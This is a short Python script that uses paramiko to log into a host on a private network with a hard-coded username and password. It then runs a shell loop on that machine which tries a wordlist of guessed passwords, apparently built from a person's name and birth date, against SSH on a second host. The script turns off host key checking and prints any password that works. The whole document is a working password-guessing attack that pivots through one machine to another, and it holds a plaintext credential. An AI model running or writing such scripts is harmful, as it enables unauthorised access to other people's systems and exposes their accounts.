import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.1.100', username='boss', password='Sshtelnet27032004!')

passwords = [
    'Sshtelnet27032004!',
    'Sshtelnet27032004',
    'sshtelnet27032004!',
    'sshtelnet27032004',
    '27032004',
    '27032004!',
    'Sshtelnet',
    'boss',
    'boss123',
    'admin',
    'root',
    'akhu',
    'akhu2024',
    'akhu2026',
    'akhu123',
    'Mansurbek',
    'mansurbek',
    'Mansurbek2703',
    'Mansurbek2004',
    'Mansurbek27032004!',
    'Mansurbek2703!',
]

cmd = f"""
for p in {' '.join(repr(p) for p in passwords)}; do
    res=$(sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 boss@192.168.1.3 "echo SUCCESS" 2>/dev/null)
    if [ "$res" = "SUCCESS" ]; then
        echo "FOUND PASSWORD FOR boss: $p"
        exit 0
    fi
done
echo "NONE FOUND"
"""
stdin, stdout, stderr = ssh.exec_command(cmd)
print(stdout.read().decode('utf-8', 'replace'))
ssh.close()
